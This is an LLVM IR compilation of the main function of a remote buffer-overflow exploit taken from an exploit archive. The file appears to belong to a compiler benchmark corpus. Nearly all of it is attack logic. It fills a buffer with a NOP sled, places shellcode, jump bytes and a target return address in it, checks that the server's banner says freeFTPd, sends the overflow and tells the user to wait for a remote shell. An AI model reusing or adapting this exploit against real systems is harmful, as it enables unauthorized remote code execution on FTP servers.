; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_1330.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_1330.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i8 }

@.str = private unnamed_addr constant [26 x i8] c"[+] Creating evil buffer\0A\00", align 1
@BUFFSIZE = common dso_local global i32 0, align 4
@BUGSTR = common dso_local global i8* null, align 8
@shellcode = common dso_local global i8* null, align 8
@jmpover = common dso_local global i8* null, align 8
@targets = common dso_local global %struct.TYPE_2__* null, align 8
@jmpback = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [31 x i8] c"[+] Connecting to remote host\0A\00", align 1
@.str.2 = private unnamed_addr constant [36 x i8] c"\0A[X] Error while recieving banner!\0A\00", align 1
@.str.3 = private unnamed_addr constant [9 x i8] c"freeFTPd\00", align 1
@.str.4 = private unnamed_addr constant [41 x i8] c"[+] Sending %d bytes of painfull buffer\0A\00", align 1
@.str.5 = private unnamed_addr constant [27 x i8] c"[X] Failed to send buffer\0A\00", align 1
@.str.6 = private unnamed_addr constant [38 x i8] c"[+] Done - Wait for shell on port %s\0A\00", align 1
@.str.7 = private unnamed_addr constant [41 x i8] c"[X] This server is not running freeFTPd\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca [256 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = call i32 (...) @banner()
  %13 = load i32, i32* %4, align 4
  %14 = icmp ne i32 %13, 6
  br i1 %14, label %27, label %15

15:                                               ; preds = %2
  %16 = load i8**, i8*** %5, align 8
  %17 = getelementptr inbounds i8*, i8** %16, i64 2
  %18 = load i8*, i8** %17, align 8
  %19 = call i64 @atoi(i8* %18)
  %20 = icmp ult i64 %19, 1
  br i1 %20, label %27, label %21

21:                                               ; preds = %15
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 2
  %24 = load i8*, i8** %23, align 8
  %25 = call i64 @atoi(i8* %24)
  %26 = icmp ugt i64 %25, 65534
  br i1 %26, label %27, label %32

27:                                               ; preds = %21, %15, %2
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 0
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 @usage(i8* %30)
  br label %32

32:                                               ; preds = %27, %21
  store i32 0, i32* %7, align 4
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str, i64 0, i64 0))
  %34 = load i32, i32* @BUFFSIZE, align 4
  %35 = call i64 @malloc(i32 %34)
  %36 = inttoptr i64 %35 to i8*
  store i8* %36, i8** %9, align 8
  %37 = load i32, i32* @BUFFSIZE, align 4
  %38 = load i8*, i8** @BUGSTR, align 8
  %39 = call i32 @strlen(i8* %38)
  %40 = add nsw i32 %37, %39
  %41 = call i64 @malloc(i32 %40)
  %42 = inttoptr i64 %41 to i8*
  store i8* %42, i8** %10, align 8
  %43 = load i8*, i8** %9, align 8
  %44 = load i32, i32* @BUFFSIZE, align 4
  %45 = call i32 @memset(i8* %43, i32 144, i32 %44)
  %46 = load i8**, i8*** %5, align 8
  %47 = getelementptr inbounds i8*, i8** %46, i64 4
  %48 = load i8*, i8** %47, align 8
  %49 = load i8**, i8*** %5, align 8
  %50 = getelementptr inbounds i8*, i8** %49, i64 3
  %51 = load i8*, i8** %50, align 8
  %52 = call i32 @inject(i8* %48, i8* %51)
  %53 = load i8*, i8** @shellcode, align 8
  %54 = call i32 @strlen(i8* %53)
  %55 = add nsw i32 %54, 100
  %56 = sub nsw i32 1007, %55
  store i32 %56, i32* %7, align 4
  %57 = load i8*, i8** %9, align 8
  %58 = load i32, i32* %7, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i8, i8* %57, i64 %59
  %61 = load i8*, i8** @shellcode, align 8
  %62 = load i8*, i8** @shellcode, align 8
  %63 = call i32 @strlen(i8* %62)
  %64 = call i32 @memcpy(i8* %60, i8* %61, i32 %63)
  %65 = load i8*, i8** @shellcode, align 8
  %66 = call i32 @strlen(i8* %65)
  %67 = add nsw i32 %66, 100
  %68 = load i32, i32* %7, align 4
  %69 = add nsw i32 %68, %67
  store i32 %69, i32* %7, align 4
  %70 = load i32, i32* %7, align 4
  %71 = add nsw i32 %70, 2
  store i32 %71, i32* %7, align 4
  %72 = load i8*, i8** %9, align 8
  %73 = load i32, i32* %7, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds i8, i8* %72, i64 %74
  %76 = load i8*, i8** @jmpover, align 8
  %77 = call i32 @memcpy(i8* %75, i8* %76, i32 2)
  %78 = load i32, i32* %7, align 4
  %79 = add nsw i32 %78, 2
  store i32 %79, i32* %7, align 4
  %80 = load i8*, i8** %9, align 8
  %81 = load i32, i32* %7, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i8, i8* %80, i64 %82
  %84 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %85 = load i8**, i8*** %5, align 8
  %86 = getelementptr inbounds i8*, i8** %85, i64 5
  %87 = load i8*, i8** %86, align 8
  %88 = call i64 @atoi(i8* %87)
  %89 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %84, i64 %88
  %90 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %89, i32 0, i32 0
  %91 = call i32 @memcpy(i8* %83, i8* %90, i32 4)
  %92 = load i32, i32* %7, align 4
  %93 = add nsw i32 %92, 4
  store i32 %93, i32* %7, align 4
  %94 = load i32, i32* %7, align 4
  %95 = add nsw i32 %94, 8
  store i32 %95, i32* %7, align 4
  %96 = load i8*, i8** %9, align 8
  %97 = load i32, i32* %7, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i8, i8* %96, i64 %98
  %100 = load i8*, i8** @jmpback, align 8
  %101 = load i8*, i8** @jmpback, align 8
  %102 = call i32 @strlen(i8* %101)
  %103 = call i32 @memcpy(i8* %99, i8* %100, i32 %102)
  %104 = load i8*, i8** @jmpback, align 8
  %105 = call i32 @strlen(i8* %104)
  %106 = load i32, i32* %7, align 4
  %107 = add nsw i32 %106, %105
  store i32 %107, i32* %7, align 4
  %108 = load i32, i32* %7, align 4
  %109 = add nsw i32 %108, 8
  store i32 %109, i32* %7, align 4
  %110 = load i8*, i8** %9, align 8
  %111 = load i32, i32* %7, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds i8, i8* %110, i64 %112
  %114 = call i32 @memset(i8* %113, i32 0, i32 1)
  %115 = load i8*, i8** %10, align 8
  %116 = load i8*, i8** @BUGSTR, align 8
  %117 = load i8*, i8** %9, align 8
  %118 = call i32 @sprintf(i8* %115, i8* %116, i8* %117)
  %119 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.1, i64 0, i64 0))
  %120 = load i8**, i8*** %5, align 8
  %121 = getelementptr inbounds i8*, i8** %120, i64 1
  %122 = load i8*, i8** %121, align 8
  %123 = load i8**, i8*** %5, align 8
  %124 = getelementptr inbounds i8*, i8** %123, i64 2
  %125 = load i8*, i8** %124, align 8
  %126 = call i64 @atoi(i8* %125)
  %127 = call i32 @remote_connect(i8* %122, i64 %126)
  store i32 %127, i32* %6, align 4
  %128 = load i32, i32* %6, align 4
  %129 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i64 0, i64 0
  %130 = call i32 @recv(i32 %128, i8* %129, i32 256, i32 0)
  store i32 %130, i32* %8, align 4
  %131 = load i32, i32* %8, align 4
  %132 = icmp ult i32 %131, 0
  br i1 %132, label %133, label %136

133:                                              ; preds = %32
  %134 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.2, i64 0, i64 0))
  %135 = call i32 (...) @close_exit()
  br label %136

136:                                              ; preds = %133, %32
  %137 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i64 0, i64 0
  %138 = call i64 @strstr(i8* %137, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0))
  %139 = icmp ne i64 %138, 0
  br i1 %139, label %140, label %159

140:                                              ; preds = %136
  %141 = call i32 @sleep(i32 1)
  %142 = load i8*, i8** %9, align 8
  %143 = call i32 @strlen(i8* %142)
  %144 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.4, i64 0, i64 0), i32 %143)
  %145 = load i32, i32* %6, align 4
  %146 = load i8*, i8** %10, align 8
  %147 = load i8*, i8** %10, align 8
  %148 = call i32 @strlen(i8* %147)
  %149 = call i64 @send(i32 %145, i8* %146, i32 %148, i32 0)
  %150 = icmp sle i64 %149, 0
  br i1 %150, label %151, label %154

151:                                              ; preds = %140
  %152 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.5, i64 0, i64 0))
  %153 = call i32 @exit(i32 1) #3
  unreachable

154:                                              ; preds = %140
  %155 = load i8**, i8*** %5, align 8
  %156 = getelementptr inbounds i8*, i8** %155, i64 4
  %157 = load i8*, i8** %156, align 8
  %158 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.6, i64 0, i64 0), i8* %157)
  br label %161

159:                                              ; preds = %136
  %160 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.7, i64 0, i64 0))
  br label %161

161:                                              ; preds = %159, %154
  %162 = load i32, i32* %6, align 4
  %163 = call i32 @close(i32 %162)
  %164 = load i8*, i8** %9, align 8
  %165 = call i32 @free(i8* %164)
  store i8* null, i8** %9, align 8
  ret i32 0
}

declare dso_local i32 @banner(...) #1

declare dso_local i64 @atoi(i8*) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @inject(i8*, i8*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i32 @remote_connect(i8*, i64) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @close_exit(...) #1

declare dso_local i64 @strstr(i8*, i8*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i64 @send(i32, i8*, i32, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @close(i32) #1

declare dso_local i32 @free(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
